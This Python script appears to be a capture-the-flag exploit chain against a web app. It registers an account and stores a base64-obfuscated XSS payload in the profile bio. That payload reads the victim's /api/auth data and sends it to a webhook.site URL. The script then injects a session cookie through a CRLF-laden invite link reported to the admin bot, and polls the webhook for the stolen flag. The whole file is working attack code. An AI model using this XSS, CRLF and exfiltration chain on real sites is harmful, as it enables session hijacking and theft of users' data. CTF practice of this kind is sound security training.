import requests, base64, random, sys, time
ihost = input('Nhap Host : ')
host = 'http://{}'.format(ihost)
i = random.randint(1111, 9999)
username = f'nilou{i}'
password = f'nilou{i}'
print(username)
print(password)
class WEBHOOK:
    def __init__(self):
        self.webhost = "https://webhook.site"
        try:
            self.token = requests.post('{}/token'.format(self.webhost)).json()
            if self.token['default_status'] != 200:
                print('Lay Token That Bai')
            else:
                self.tokenid = self.token['uuid']
        except:
            print('An Error Appeared In Getting Token')
    def get_flag(self):
        try:
            resp = requests.get('{}/token/{}/request/latest'.format(self.webhost,self.tokenid), timeout=15)
            flag = resp.json()['query']['flag']
        except:
            return False
        return flag
    def destroy(self):
        requests.delete('{}/token/{}'.format(self.webhost,self.tokenid), timeout=15)
def register():
    try: 
        Jdata = {"username" : username, "email" : username + "@gmail.com", "password" : password}
        resp = requests.post('{}/api/register'.format(host), json=Jdata).status_code
        if resp != 201: 
            print("SomeThing Went Wrong When Register")
            sys.exit()
    except Exception as e:
        print(f'Error At Register : {e}')

def login():
    try:
        Jdata = {"username" : username, "password" : password}
        Auth = requests.post('{}/api/login'.format(host), json=Jdata).cookies.get('session')
        if not Auth: 
            print("SomeThing Went Wrong When Login")
            sys.exit()
        return Auth
    except Exception as e:
        print(f'Error At Login : {e}')
def generate_XSS(webhook):
    rawpayload = """
    fetch('/api/auth').then(res => res.json()).then(data => 
    {
        new Image().src = '%s?flag=' + data.user.flag; 
    })
    """ % webhook
    base64Payload = base64.b64encode(rawpayload.encode('utf-8')).decode('utf-8')
    xsspayload = "<img src=1 onerror=eval(atob('{}'))>".format(base64Payload)
    return xsspayload
def update_bio(cookies, xsspayload):
    try:
        Jdata = {"username" : username, "email" : username + "@gmail.com", "bio" : xsspayload}
        requests.post('{}/api/profile'.format(host), json=Jdata, cookies= { 'session' : cookies})
    except Exception as e:
        print(f'Error At UpdateBio : {e}')
def generate_crlf(cookies):
    crlf_payload = "/invite/aaa%0D%0ASet-Cookie:%20session={};%20Path=/api/profile".format(cookies)
    return crlf_payload
def report_to_admin(session, crlf_payload):
    postData = {"postThread": crlf_payload, "reason": "I breathe JS"}
    response = requests.post("%s/api/report" % host, json=postData, cookies={
        'session': session
    })

    if response.status_code != 200:
        print("Something went wrong while reporting to admin!")
        print(response)
        sys.exit()
def main():
    print('[ Signing Up A New Account ]')
    register()

    print('[ Logging ]')
    session = login()

    print('[ Generating Webhook ]')
    webhook = WEBHOOK()
    webhookURL = webhook.webhost + '/' + webhook.tokenid
    print('[ Generating XSS ]')
    XSSPayload = generate_XSS(webhookURL)

    print('[ Update Bio ]')
    update_bio(session, XSSPayload)

    print('[ Generating CRLF ]')
    CRLFPayload = generate_crlf(session)

    print('[ Report To Trigger Admin Bot ]')
    report_to_admin(session, CRLFPayload)

    print('[ Waiting For Flag... ]')
    while True:
        flag = webhook.get_flag()
        if flag:
            break
        time.sleep(3)

    print('[ Flag here : {} ]'.format(flag))

    print('[ Clear WebHook ]')
    webhook.destroy()
if __name__ == "__main__":
    main()
